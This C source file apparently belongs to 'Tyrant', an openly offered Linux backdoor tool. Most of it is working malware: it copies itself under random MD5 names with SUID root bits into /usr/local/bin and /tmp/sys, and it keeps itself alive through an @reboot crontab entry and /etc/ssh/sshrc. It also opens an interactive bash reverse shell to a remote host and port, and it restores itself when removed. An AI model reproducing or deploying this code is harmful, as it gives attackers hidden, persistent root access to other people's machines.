/*

 /$$      /$$                       /$$               /$$           /$$$$$$      /$$$$$$          /$$   /$$ /$$   /$$  /$$$$$$  /$$   /$$   /$$    /$$$$$$ 
| $$$    /$$$                      | $$              | $$         /$$$__  $$$   /$$__  $$        | $$  | $$| $$  | $$ /$$__  $$| $$  /$$/ /$$$$   /$$__  $$
| $$$$  /$$$$  /$$$$$$   /$$$$$$  /$$$$$$   /$$$$$$$ | $$$$$$$   /$$_/  \_  $$ | $$  \__/        | $$  | $$| $$  | $$| $$  \__/| $$ /$$/ |_  $$  |__/  \ $$
| $$ $$/$$ $$ |____  $$ /$$__  $$|_  $$_/  | $$__  $$| $$__  $$ /$$/ /$$$$$  $$|  $$$$$$  /$$$$$$| $$$$$$$$| $$$$$$$$| $$      | $$$$$/    | $$     /$$$$$/
| $$  $$$| $$  /$$$$$$$| $$  \ $$  | $$    | $$  \ $$| $$  \ $$| $$ /$$  $$| $$ \____  $$|______/| $$__  $$|_____  $$| $$      | $$  $$    | $$    |___  $$
| $$\  $ | $$ /$$__  $$| $$  | $$  | $$ /$$| $$  | $$| $$  | $$| $$| $$\ $$| $$ /$$  \ $$        | $$  | $$      | $$| $$    $$| $$\  $$   | $$   /$$  \ $$
| $$ \/  | $$|  $$$$$$$| $$$$$$$/  |  $$$$/| $$  | $$| $$  | $$| $$|  $$$$$$$$/|  $$$$$$/        | $$  | $$      | $$|  $$$$$$/| $$ \  $$ /$$$$$$|  $$$$$$/
|__/     |__/ \_______/| $$____/    \___/  |__/  |__/|__/  |__/|  $$\________/  \______/         |__/  |__/      |__/ \______/ |__/  \__/|______/ \______/ 
                       | $$                                     \  $$$   /$$$                                                                              
                       | $$                                      \_  $$$$$$_/                                                                              
                       |__/                                        \______/                                                                                
*/
#include "core.h"
#include <libgen.h>
#include <pwd.h>
#include <grp.h>

/* LOGO */
const char * ascii_art[] = {
  "___________                            __   ",
  "\\__    ___/__.__.____________    _____/  |_ ",
  "  |    | <   |  |\\_  __ \\__  \\  /    \\   __\\",
  "  |    |  \\___  | |  | \\/ __ \\|   |  \\  |  ",
  "  |____|  / ____| |__|  (____  /___|  /__|  ",
  "          \\/                 \\/     \\/      ",
  "   Maptnh@S-H4CK13   https://github.com/MartinxMax/Tyrant"
};

const char * ascii_art_rev[] = {
  "___________                            __   ",
  "\\__    ___/__.__.____________    _____/  |_ ",
  "  |    | <   |  |\\_  __ \\__  \\  /    \\   __\\",
  "  |    |  \\___  | |  | \\/ __ \\|   |  \\  |  ",
  "  |____|  / ____| |__|  (____  /___|  /__|  ",
  "          \\/                 \\/     \\/      ",
};
void print_ascii_art() {
  int num_lines = sizeof(ascii_art) / sizeof(ascii_art[0]);
  for (int i = 0; i < num_lines; i++) {
    printf("%s\n", ascii_art[i]);
  }
}
/* Display all user UIDs [return:null] */
void list_all_users() {
  FILE * file;
  char line[256];
  char * username, * uid, * home_dir;

  file = fopen("/etc/passwd", "r");
  if (file == NULL) {
    printf("[!] Failed to open /etc/passwd file\n");
    exit(EXIT_FAILURE);
  }

  printf("%-20s %-8s %-30s\n", "Username", "UID", "Home Directory");
  printf("%-20s %-8s %-30s\n", "--------", "----", "------------");

  while (fgets(line, sizeof(line), file)) {
    line[strcspn(line, "\n")] = '\0';

    username = strtok(line, ":");
    if (username == NULL) {
      continue;
    }
    strtok(NULL, ":");
    uid = strtok(NULL, ":");
    strtok(NULL, ":");
    strtok(NULL, ":");
    home_dir = strtok(NULL, ":");

    if (uid == NULL) {
      continue;
    }
    if (home_dir == NULL) {
      home_dir = "(null)";
    }

    printf("%-20s %-8s %-30s\n", username, uid, home_dir);
  }
  fclose(file);
}
/* Get machine id [return:str] */
static void fill_fallback_machine_id(char * machine_id, size_t n) {
  char * random_md5 = generate_random_md5();
  if (random_md5 == NULL) {
    printf("[!] Failed to generate random MD5\n");
    exit(EXIT_FAILURE);
  }
  snprintf(machine_id, n, "%s", random_md5);
  free(random_md5);
}

char * get_machine_id() {
  static char machine_id[64];
  FILE * machine_file = fopen("/etc/machine-id", "r");
  if (machine_file == NULL) {
    printf("[!] Failed to open /etc/machine-id file, generating random MD5.\n");
    fill_fallback_machine_id(machine_id, sizeof(machine_id));
    return (machine_id);
  }

  if (fgets(machine_id, sizeof(machine_id), machine_file)) {
    machine_id[strcspn(machine_id, "\n")] = '\0';
    fclose(machine_file);
    return (machine_id);
  }

  fclose(machine_file);
  printf("[!] Failed to read /etc/machine-id content, generating random MD5.\n");
  fill_fallback_machine_id(machine_id, sizeof(machine_id));
  return (machine_id);
}
/* Back door laoder [return:null] */
void backdoor_loader(void) {
  char * random_md5 = generate_random_md5();
  if (random_md5 == NULL) {
    fprintf(stderr, "Failed to generate MD5\n");
    exit(EXIT_FAILURE);
  }
  printf("[+] Backdoor loading...\n");

  char destination[PATH_MAX];
  snprintf(destination, sizeof(destination), "/usr/local/bin/%s", random_md5);

  char src_path[PATH_MAX];
  ssize_t len = readlink("/proc/self/exe", src_path, sizeof(src_path) - 1);
  if (len == -1) {
    perror("readlink");
    free(random_md5);
    exit(EXIT_FAILURE);
  }
  src_path[len] = '\0';

  int src_fd = open(src_path, O_RDONLY);
  if (src_fd == -1) {
    perror("open");
    free(random_md5);
    exit(EXIT_FAILURE);
  }

  int dst_fd = open(destination, O_WRONLY | O_CREAT | O_TRUNC, 0700);
  if (dst_fd == -1) {
    perror("open");
    close(src_fd);
    free(random_md5);
    exit(EXIT_FAILURE);
  }

  ssize_t bytes_read;
  char buffer[4096];
  while ((bytes_read = read(src_fd, buffer, sizeof(buffer))) > 0) {
      if (write(dst_fd, buffer, bytes_read) != bytes_read) {
      perror("write");
      close(src_fd);
      close(dst_fd);
      free(random_md5);
      exit(EXIT_FAILURE);
    }
  }

  if (bytes_read == -1) {
    perror("read");
    close(src_fd);
    close(dst_fd);
    free(random_md5);
    exit(EXIT_FAILURE);
  }
  close(src_fd);
  close(dst_fd);
  printf("[+] Backdoor loaded successfully: %s\n", random_md5);

  // Set execute permissions and SUID
  if (chmod(destination, S_IRWXU | S_IXGRP | S_IXOTH | S_ISUID) == -1) {
    perror("chmod failed");
    free(random_md5);
    exit(EXIT_FAILURE);
  }

  printf("[+] Reloaded the payload\n");

  // Start the backdoor by executing the copied file
  char * argv[] = {
    destination,
    NULL
  };
  execv(destination, argv);

  perror("execv failed");
  free(random_md5);
  exit(EXIT_FAILURE);
}
/* Normal method when payload in other directory [return:null] */
void normal_method(bool backdoor_mode, int target_uid,
  const char * rhost, int rport) {
 
  if (has_suid_privileges() || is_root()) {
    if (backdoor_mode) {
      char * file_hash = get_current_file_hash();
      if (file_hash == NULL) {
        return;
      }
      delete_extra_files_with_hash(file_hash, false);
      free(file_hash);
      create_tyrant_script();
      backdoor_loader();

    } else {
      if (!has_suid_privileges()) {
        set_suid();
      }
      if (rhost != NULL && rhost[0] != '\0' && rport > 0) {
        reverse_shell(target_uid, rhost, rport);
      }
    }
  } else {
    printf("[!] You must run the script as root user\n");
    exit(EXIT_FAILURE);
  }
}
/* Reverse Shell Payload [return:null] */
void reverse_shell(int uid,
  const char * rhost, int rport) {
  int sockfd;
  struct sockaddr_in target;
  set_uid(uid);
  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if (sockfd < 0) {
    printf("[!] Failed to create socket\n");
    exit(EXIT_FAILURE);
  }

  target.sin_family = AF_INET;
  target.sin_port = htons(rport);
  if (inet_pton(AF_INET, rhost, & target.sin_addr) <= 0) {
    printf("[!] Invalid IP address\n");
    close(sockfd);
    exit(EXIT_FAILURE);
  }

  if (connect(sockfd, (struct sockaddr * ) & target, sizeof(target)) < 0) {
    printf("[!] Reverse Shell establishment failed, unable to connect to the host\n");
    close(sockfd);
    exit(EXIT_FAILURE);
  }

  dup2(sockfd, 0);
  dup2(sockfd, 1);
  dup2(sockfd, 2);

  for (int i = 0; i < (int)(sizeof(ascii_art_rev) / sizeof(ascii_art_rev[0])); i++) {
    write(1, ascii_art_rev[i], strlen(ascii_art_rev[i]));
    write(1, "\n", 1);
  }

  execl("/bin/bash", "bash", "-i", NULL);
  close(sockfd);
  exit(EXIT_FAILURE);
}
/* Set current session uid [return:null] */
void set_uid(int target_uid) {
  if (has_suid_privileges() || is_root()) {
    uid_t real_uid = getuid();
    uid_t effective_uid = geteuid();
    
    /* Security check: When running with elevated privileges (SUID or root),
     * prevent privilege escalation by ensuring the target UID is authorized.
     * Only allow:
     * 1. Dropping to the real UID of the calling user
     * 2. If real user is already root (UID 0), allow any target UID
     * This prevents unprivileged users from escalating to root via SUID executables.
     */
    if (effective_uid == 0 && real_uid != 0) {
      /* Running with elevated privileges (SUID root or sudo) but real user is not root */
      if (target_uid != (int)real_uid) {
        fprintf(stderr, "[!] Security violation: Cannot change UID to %d. ", target_uid);
        fprintf(stderr, "When running with elevated privileges, you can only drop to your real UID (%d).\\n", real_uid);
        fprintf(stderr, "[!] Privilege escalation attempt blocked.\\n");
        exit(EXIT_FAILURE);
      }
      /* Allow dropping to real UID - this is a legitimate privilege drop */
    }
    /* If real_uid == 0, the actual user is root, so allow any target_uid */
    
    printf("[*] Current user is root, setting UID to %d...\n", target_uid);
    struct passwd * pw = getpwuid((uid_t) target_uid);
    gid_t gid = pw ? pw -> pw_gid : (gid_t) target_uid;
    if (pw && initgroups(pw -> pw_name, gid) < 0) {
      perror("[!] Failed to set supplementary groups");
    }
    if (setgid(gid) < 0) {
      perror("[!] Failed to set GID");
      exit(EXIT_FAILURE);
    }
    if (setuid(target_uid) < 0) {
      perror("[!] Failed to set UID");
      exit(EXIT_FAILURE);
    }
    printf("[*] UID set to %d successfully.\n", target_uid);
  } else {
    printf("[!] Current user is not root, UID: %d.\n", getuid());
    printf("[!] Root privileges are required to perform this operation.\n");
    exit(EXIT_FAILURE);
  }
}
/* Determine whether the current user has root privileges [return:bool] */
bool is_root() {
  return (getuid() == 0);
}
/* Creating a Catalog Set [return:null] */
void create_directory_if_not_exists(const char * dir_path) {
  struct stat st = {
    0
  };
  if (stat(dir_path, & st) == -1) {
    if (mkdir(dir_path, 0700) == -1) {
      perror("[!] Failed to create directory");
    } else {
      printf("[+] Directory created: %s\n", dir_path);
    }
  }
}
/* Update the configuration file [/etc/ty.conf] [return:null] */
void write_ty_conf(char * md5_name) {
  if (md5_name == NULL || !is_valid_md5(md5_name)) {
    return;
  }
  FILE * file = fopen("/etc/ty.conf", "w");
  if (file == NULL) {
    perror("Failed to open /etc/ty.conf for writing");
    return;
  }

  if (md5_name != NULL && strlen(md5_name) > 0) {
    fprintf(file, "%s\n", md5_name);
  }

  fclose(file);
}
/* Update the configuration file [/etc/ssh/sshrc] [return:null] */
void write_sshrc(char * md5_name) {
  if (md5_name == NULL || !is_valid_md5(md5_name)) {
    return;
  }
  if (create_directory_if_needed("/etc/ssh") != 0) {
    fprintf(stderr, "[!] Failed to create or validate /etc/ssh directory\n");
    return;
  }

  char line[PATH_MAX];
  snprintf(line, sizeof(line), "/tmp/sys/%s", md5_name);

  FILE * existing = fopen("/etc/ssh/sshrc", "r");
  if (existing != NULL) {
    char buf[PATH_MAX];
    while (fgets(buf, sizeof(buf), existing)) {
      buf[strcspn(buf, "\n")] = '\0';
      if (strcmp(buf, line) == 0) {
        fclose(existing);
        return;
      }
    }
    fclose(existing);
  }

  FILE * file = fopen("/etc/ssh/sshrc", "a");
  if (file == NULL) {
    perror("Failed to open /etc/ssh/sshrc for writing");
    return;
  }
  fprintf(file, "%s\n", line);
  fclose(file);
}
/* Update the configuration file [/etc/ssh/sshrc] [return:null] */
void add_to_crontab(const char * mainhash,
  const char * clihash) {
  (void) clihash;
  if (mainhash == NULL || strchr(mainhash, '\'') != NULL) {
    fprintf(stderr, "[!] Invalid crontab path\n");
    return;
  }

  char cmd[2048];
  snprintf(cmd, sizeof(cmd),
    "(crontab -l 2>/dev/null | grep -v '@reboot sleep 10 && nohup'; "
    "echo \"@reboot sleep 10 && nohup '%s' >/dev/null 2>&1 &\") | crontab -",
    mainhash);

  system(cmd);
}
/* Ensure the directory exists, create it if necessary [return: int] */
int create_directory_if_needed(const char * dir_path) {
  struct stat st = {
    0
  };
  
  /* Use lstat to not follow symlinks */
  if (lstat(dir_path, & st) == -1) {
    /* Directory doesn't exist, create it */
    if (mkdir(dir_path, 0700) == -1) {
      return -1;
    }

    if (chmod(dir_path, 0700) == -1) {
      return -1;
    }
  } else {
    /* Path exists, validate it's safe to use */
    
    /* Check if it's a directory (not a symlink or regular file) */
    if (!S_ISDIR(st.st_mode)) {
      fprintf(stderr, "[!] Security: %s exists but is not a directory\n", dir_path);
      return -1;
    }
    
    /* Check if it's owned by root (uid 0) */
    if (st.st_uid != 0) {
      fprintf(stderr, "[!] Security: %s is not owned by root (owner: %d)\n", dir_path, st.st_uid);
      return -1;
    }
    
    /* Check if permissions are restrictive (no world or group write) */
    if ((st.st_mode & (S_IWGRP | S_IWOTH)) != 0) {
      fprintf(stderr, "[!] Security: %s has insecure permissions (mode: %o)\n", dir_path, st.st_mode & 0777);
      return -1;
    }
  }
  return 0;
}
/* Count the number of files with a specific hash in the directory [/usr/local/bin] [return: int] */
int count_files_with_hash(const char *hash) {
    int count = 0;
    DIR *dir = opendir("/usr/local/bin");

    if (dir == NULL) {
        perror("opendir");
        return -1;
    }
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_name[0] == '.') {
            continue;
        }

        char file_path[PATH_MAX];
        snprintf(file_path, sizeof(file_path), "/usr/local/bin/%s", entry->d_name);
        struct stat file_stat;
        if (stat(file_path, &file_stat) == 0 && S_ISREG(file_stat.st_mode) && (file_stat.st_mode & S_IXUSR)) {
            char *file_hash = get_file_hash(file_path);
            if (file_hash != NULL) {
                if (strcmp(file_hash, hash) == 0) {
                    count++;
                }
                free(file_hash);
            }
 
        }
    }
    
    closedir(dir);
    return count;
}
void delete_extra_files_with_hash(const char *hash, bool keep_last) {
    int count = 0;
    size_t cap = 0;
    char **file_paths = NULL;
    DIR *dir = opendir("/usr/local/bin");

    if (dir == NULL) {
        perror("opendir");
        return;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_name[0] == '.') {
            continue;
        }
        char file_path[PATH_MAX];
        snprintf(file_path, sizeof(file_path), "/usr/local/bin/%s", entry->d_name);

        struct stat file_stat;
        if (stat(file_path, &file_stat) == 0 && S_ISREG(file_stat.st_mode) && (file_stat.st_mode & S_IXUSR)) {
            char *file_hash = get_file_hash(file_path);

            if (file_hash != NULL) {
                if (strcmp(file_hash, hash) == 0) {
                    if ((size_t)count == cap) {
                        size_t ncap = cap ? cap * 2 : 16;
                        char **grown = realloc(file_paths, ncap * sizeof(*grown));
                        if (grown == NULL) {
                            perror("realloc");
                            free(file_hash);
                            continue;
                        }
                        file_paths = grown;
                        cap = ncap;
                    }
                    file_paths[count] = strdup(file_path);
                    if (file_paths[count] == NULL) {
                        perror("strdup");
                        free(file_hash);
                        continue;
                    }
                    count++;
                }
                free(file_hash);
            }
        }
    }

    closedir(dir);

    if (count == 0) {
        printf("[!] No files with the given hash found.\n");
        free(file_paths);
        return;
    }

    int unlink_until = keep_last ? count - 1 : count;
    for (int i = 0; i < unlink_until; i++) {
        if (unlink(file_paths[i]) == -1) {
            perror("unlink");
        }
        free(file_paths[i]);
    }
    if (keep_last) {
        free(file_paths[count - 1]);
    }
    free(file_paths);
}
/* Local exploit execution function. Creates directory if needed,
   checks if there are duplicate files, and sets up payload. */
void local_exp(const char * path) {
  
  char last_cli_md5_hash[PATH_MAX] = {
    0
  };

  if (create_directory_if_needed("/tmp/sys") != 0) {
    fprintf(stderr, "[!] Failed to create or validate /tmp/sys directory\n");
    return;
  }

  char * self_hash = get_file_hash(path);
  if (self_hash == NULL) {
    fprintf(stderr, "Failed to get hash for file: %s\n", path);
    return;
  }

  if (count_files_with_hash(self_hash) > 1) {
    delete_extra_files_with_hash(self_hash, true);
    printf("[!] More than one file with the same hash exists. Exiting.\n");
    free(self_hash);
    return;
  }
  add_to_crontab(path, "");

  while (true) {
    char existing_file_path[PATH_MAX];
    int is_duplicate = check_tmp_for_same_hash(self_hash, existing_file_path);

    if (!is_duplicate) {
      char * random_cli_hash = generate_random_md5();
      if (random_cli_hash == NULL) {
        sleep(5);
        continue;
      }

      char new_file_path[PATH_MAX];
      snprintf(new_file_path, sizeof(new_file_path), "/tmp/sys/%s", random_cli_hash);

      int src_fd = open(path, O_RDONLY);
      if (src_fd == -1) {
        perror("open source file");
        free(random_cli_hash);
        free(self_hash);
        return;
      }

      /* Use O_NOFOLLOW to prevent symlink attacks */
      int dst_fd = open(new_file_path, O_WRONLY | O_CREAT | O_EXCL | O_NOFOLLOW, 0700);
      if (dst_fd == -1) {
        perror("open destination file");
        close(src_fd);
        free(random_cli_hash);
        free(self_hash);
        return;
      }

      char buffer[1024];
      ssize_t bytes_read;
      while ((bytes_read = read(src_fd, buffer, sizeof(buffer))) > 0) {
        if (write(dst_fd, buffer, bytes_read) != bytes_read) {
          perror("write");
          close(src_fd);
          close(dst_fd);
          free(random_cli_hash);
          free(self_hash);
          return;
        }
      }

      if (bytes_read == -1) {
        perror("read");
      }

      close(src_fd);
      
      /* Use fchmod on file descriptor instead of path-based chmod to prevent TOCTOU */
      if (fchmod(dst_fd, S_IRWXU | S_IXGRP | S_IXOTH | S_ISUID) == -1) {
        perror("fchmod");
        close(dst_fd);
        free(random_cli_hash);
        free(self_hash);
        return;
      }
      
      close(dst_fd);
      
      /* Additional SUID setting via system call for compatibility */
      char cmd[PATH_MAX];
      snprintf(cmd, sizeof(cmd), "chmod u+s %s 2>/dev/null", new_file_path);
      system(cmd);
      printf("[+] Fix the payload\n");

      write_sshrc(random_cli_hash);
      write_ty_conf(random_cli_hash);
      strncpy(last_cli_md5_hash, random_cli_hash, sizeof(last_cli_md5_hash) - 1);
      last_cli_md5_hash[sizeof(last_cli_md5_hash) - 1] = '\0';
      free(random_cli_hash);

    } else {

      char * cli_md5_hash = basename(existing_file_path);

      if (is_valid_md5(cli_md5_hash)) {
        write_sshrc(cli_md5_hash);
        write_ty_conf(cli_md5_hash);
      }

      if (strcmp(cli_md5_hash, last_cli_md5_hash) != 0 && (is_valid_md5(cli_md5_hash))) {
        strncpy(last_cli_md5_hash, cli_md5_hash, sizeof(last_cli_md5_hash) - 1);
        last_cli_md5_hash[sizeof(last_cli_md5_hash) - 1] = '\0';
      }

    }
    sleep(5);
  }
}
/* Temporary process handler that handles file duplication and
   sets up a reverse shell if a file with the same hash exists. */
void tmp_proc(const char * path, int id,
  const char * rhost, int rport) {
  
  char * self_hash = get_file_hash(path);
  if (self_hash == NULL) {
    fprintf(stderr, "Failed to get hash for file: %s\n", path);
    return;
  }
  
  char * random_cli_hash = generate_random_md5();
  if (random_cli_hash == NULL) {
    free(self_hash);
    return;
  }

  char existing_file_path[PATH_MAX];
  if (!check_local_for_same_hash(self_hash, existing_file_path)) {
    char new_file_path[PATH_MAX];
    snprintf(new_file_path, sizeof(new_file_path), "/usr/local/bin/%s", random_cli_hash);

    int src_fd = open(path, O_RDONLY);
    if (src_fd == -1) {
      perror("open source file");
      free(random_cli_hash);
      free(self_hash);
      return;
    }

    int dst_fd = open(new_file_path, O_WRONLY | O_CREAT | O_TRUNC, 0700);
    if (dst_fd == -1) {
      perror("open destination file");
      close(src_fd);
      free(random_cli_hash);
      free(self_hash);
      return;
    }

    char buffer[1024];
    ssize_t bytes_read;
    while ((bytes_read = read(src_fd, buffer, sizeof(buffer))) > 0) {
      if (write(dst_fd, buffer, bytes_read) != bytes_read) {
        perror("write");
        close(src_fd);
        close(dst_fd);
        free(random_cli_hash);
        free(self_hash);
        return;
      }
    }

    if (bytes_read == -1) {
      perror("read");
    }

    close(src_fd);
    close(dst_fd);

    chmod(new_file_path, S_IRWXU | S_IXGRP | S_IXOTH | S_ISUID);

    char cmd[PATH_MAX];
    snprintf(cmd, sizeof(cmd), "chmod u+s %s 2>/dev/null", new_file_path);
    system(cmd);
    printf("[+] Repaired the backdoor successfully\n");
    printf("[+] Use the command to start the backdoor => %s\n", extract_filename(new_file_path));
  } else {
    free(random_cli_hash);
    free(self_hash);
    reverse_shell(id, rhost, rport);
    return;
  }
  free(random_cli_hash);
  free(self_hash);
}
/* Checks if a file with the given hash exists in the /usr/local/bin directory.
   If found, it stores the file path in out_path and returns 1. Otherwise, returns 0. */
int check_local_for_same_hash(const char * hash, char * out_path) {
  DIR * dir = opendir("/usr/local/bin");
  if (dir == NULL) {
    perror("opendir");
    return (0);
  }

  struct dirent * entry;
  while ((entry = readdir(dir)) != NULL) {
    if (entry -> d_name[0] == '.') {
      continue;
    }

    char file_path[PATH_MAX];
    snprintf(file_path, sizeof(file_path), "/usr/local/bin/%s", entry -> d_name);

    char * file_hash = get_file_hash(file_path);
    if (file_hash != NULL && strcmp(file_hash, hash) == 0) {
      snprintf(out_path, PATH_MAX, "%s", file_path);
      free(file_hash);
      closedir(dir);
      return (1);
    }
    free(file_hash);
  }
 
  closedir(dir);
  return (0);
}
/* Checks if a file with the given hash exists in the /tmp/sys directory.
   If found, it stores the file path in out_path and returns 1. Otherwise, returns 0. */
int check_tmp_for_same_hash(const char * hash, char * out_path) {
  DIR * dir = opendir("/tmp/sys");
  if (dir == NULL) {
    perror("opendir");
    return (0);
  }

  struct dirent * entry;
  while ((entry = readdir(dir)) != NULL) {
    if (entry -> d_name[0] == '.') {
      continue;
    }

    char file_path[PATH_MAX];
    snprintf(file_path, sizeof(file_path), "/tmp/sys/%s", entry -> d_name);

    char * file_hash = get_file_hash(file_path);
    if (file_hash != NULL) {
      if (strcmp(file_hash, hash) == 0) {
        snprintf(out_path, PATH_MAX, "%s", file_path);
        free(file_hash);
        closedir(dir);
        return (1);
      }
      free(file_hash);
    }
  
  }

  closedir(dir);
  return (0);
}
/* Sets the SUID bit on the current executable and changes its owner to root */
void set_suid() {
  if (has_suid_privileges() || is_root()) {
    printf("[*] Current user is root.\n");

    char path[1024];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);

    if (len < 0) {
      printf("[!] Unable to get program path\n");
      exit(EXIT_FAILURE);
    }

    path[len] = '\0';

    if (access(path, F_OK) != 0) {
      printf("[!] File does not exist: %s\n", path);
      exit(EXIT_FAILURE);
    }

    if (chown(path, 0, 0) < 0) {
      printf("[!] Failed to change file owner to root\n");
      exit(EXIT_FAILURE);
    }

    if (chmod(path, 04755) < 0) {
      printf("[!] Failed to set SUID permissions\n");
      exit(EXIT_FAILURE);
    }

    printf("[*] Successfully set the SUID bit and changed owner to root for the script: %s\n", path);
  } else {
    printf("[!] Current user is not root, UID: %d.\n", getuid());
    exit(EXIT_FAILURE);
  }
}
/* Checks if the current process has SUID privileges */
bool has_suid_privileges() {
  struct stat file_stat;
  if (stat("/proc/self/exe", & file_stat) == -1) {
    return (false);
  }
  if ((file_stat.st_mode & S_ISUID) && (file_stat.st_uid == 0)) {
    return (true);
  } else {
    return (false);
  }
}
/* Checks if the current script name is a valid MD5 hash */
int check_script_name_is_md5() {
  char script_name[1024];
  ssize_t len = readlink("/proc/self/exe", script_name, sizeof(script_name) - 1);
  if (len == -1) {
    perror("readlink");
    return (0);
  }

  script_name[len] = '\0';
  char * last_slash = strrchr(script_name, '/');
  if (last_slash) {
    last_slash++;
  } else {
    last_slash = script_name;
  }
  if (is_valid_md5(last_slash)) {
    return (1);
  } else {
    return (0);
  }
}
/* Gets the hash of the current executable file */
char * get_current_file_hash() {
  char path[PATH_MAX];

  ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
  if (len == -1) {
    perror("readlink");
    return NULL;
  }
  path[len] = '\0';

  return get_file_hash(path);
}
/* Checks the program directory and executes local_exp or tmp_proc based on directory */
void check_program_directory(int target_uid,
  const char * rhost, int rport) {
  char * self_hash = get_current_file_hash();
  if (self_hash == NULL) {
    return;
  }
  int already_running = check_running_process_with_hash(self_hash);
  free(self_hash);
  if (already_running) {
    return;
  }
  char path[PATH_MAX];

  ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
  if (len == -1) {
    perror("readlink");
    return;
  }
  path[len] = '\0';

  char * path_copy = strdup(path);
  if (!path_copy) {
    perror("strdup");
    return;
  }

  char * dir = dirname(path_copy);

  struct stat statbuf;

  if (strcmp(dir, "/usr/local/bin") == 0) {
    if (stat(path, & statbuf) == 0) {
      if ((statbuf.st_mode & S_IRWXU) == S_IRWXU) {
        create_tyrant_script();
        local_exp(path);
      } else {
        if (chmod(path, S_IRWXU) == -1) {
          perror("chmod failed");
          free(path_copy);
          return;
        }
      }
    } else {
      perror("stat failed");
    }
  } else if (strcmp(dir, "/tmp/sys") == 0) {
    create_tyrant_script();
    tmp_proc(path, target_uid, rhost, rport);
  }

  free(path_copy);
}
/* Checks if multiple processes with the same hash value are running */
int check_running_process_with_hash(const char * hash) {
  if (hash == NULL) {
    return -1;
  }
  int process_count = 0;
  DIR * dir = opendir("/usr/local/bin");
  if (dir == NULL) {
    perror("opendir");
    return -1;
  }

  struct dirent * entry;
  char file_path[PATH_MAX];
  while ((entry = readdir(dir)) != NULL) {
    if (entry -> d_name[0] == '.')
      continue;

    snprintf(file_path, sizeof(file_path), "/usr/local/bin/%s", entry -> d_name);

    char * file_hash = get_file_hash(file_path);
    if (file_hash != NULL && strcmp(file_hash, hash) == 0) {

      FILE * fp = popen("ps aux", "r");
      if (fp == NULL) {
        perror("popen");
        free(file_hash);
        closedir(dir);
        return -1;
      }

      char line[1024];
      while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, file_path)) {
          process_count++;
        }
      }

      pclose(fp);
    }
    free(file_hash);
  }

  closedir(dir);

  if (process_count > 1) {
    return 1;
  }

  return 0;
}
/* Extracts the filename from the given path */
const char * extract_filename(const char * path) {
  const char * filename = strrchr(path, '/');
  if (filename) {
    return filename + 1;
  }
  return "";
}
/* Creating a Help File */

void create_tyrant_script() {
    // Script content
    const char *script_content = "#!/bin/bash\n"
                                 "conf_content=$(cat /etc/ty.conf)\n"
                                 "backdoor_command=$(crontab -l | grep '@reboot sleep 10 && nohup' | awk -F 'nohup ' '{print $2}' | awk '{print $1}')\n"   
                                 "if [[ -n \"$conf_content\" && -z \"$backdoor_command\" ]]; then\n"
                                 "  echo \"[!] Backdoor module is broken, recovering program located at /tmp/sys/$conf_content\"\n"
                                 "elif [[ -z \"$conf_content\" && -n \"$backdoor_command\" ]]; then\n"
                                 "  echo \"[!] Try running the backdoor command or shut down to automatically reload the payload\"\n"
                                 "elif [[ -z \"$conf_content\" && -z \"$backdoor_command\" ]]; then\n"
                                 "  echo \"[!] Please reload the backdoor, it has been removed\"\n"
                                 "else\n"
                                 "  echo \"[+] Program located at /tmp/sys/$conf_content\"\n"
                                 "  echo \"[+] Backdoor start command: $backdoor_command\"\n"
                                 "fi";
    
    const char *script_path = "/usr/local/bin/tyrant";
    
    FILE *file = fopen(script_path, "w");
    if (file == NULL) {
        perror("Unable to create tyrant");
        return;
    }

    fputs(script_content, file);
    
    fclose(file);
    if (chmod(script_path, S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH) != 0) {
        perror("Unable to set file permissions");
        return;
    }

    printf("[+] Use commands to obtain backdoor information => $ tyrant\n");
}